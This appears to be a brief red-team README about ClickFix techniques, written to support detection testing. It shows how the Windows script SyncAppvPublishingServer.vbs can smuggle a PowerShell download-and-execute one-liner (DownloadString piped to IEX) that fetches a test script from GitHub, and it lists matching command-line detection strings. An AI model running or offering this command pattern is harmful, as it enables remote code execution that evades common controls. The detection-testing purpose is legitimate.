# ClickFix-Techniques
Techniques for ClickFix to test with. The goal is to perform testing that will help detections.

## SyncAppvPublishingServer.vbs
Adversaries have been found to use SyncAppvPublishingServer.vbs as an [alternative to powershell or mshta.](https://expel.com/blog/clearfake-new-lotl-techniques/)

Script used related to app-v and publishing server and built into Windows at _C:\Windows\System32\SyncAppvPublishingServer.vbs_

[**Usage:**](https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/) The following will use SyncAppvPublishingServer.vbs to execute a command of 'notepad.exe' hosted on MY Github.
```
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/villaroot/villaroot-test/refs/heads/main/testNotepad.bat') | IEX"
```

[**Detect:**](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml) Look for the following in the command line
```
- '\SyncAppvPublishingServer.vbs'
- ';'
```

## Obfuscation

